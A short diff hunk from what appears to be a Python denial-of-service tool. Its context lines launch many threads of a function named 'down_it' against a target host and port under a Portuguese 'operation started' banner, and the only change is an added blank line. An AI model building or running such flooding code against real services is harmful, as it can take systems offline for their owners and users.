@@ -74,3 +74,4 @@ if __name__ == '__main__':
     print(f"{Fore.RED}[!] OPERAÇÃO INICIADA EM {host}:{port}\n")
     with ThreadPoolExecutor(max_workers=thr) as executor:
         for i in range(thr): executor.submit(down_it, i, host, port, h_list)
+
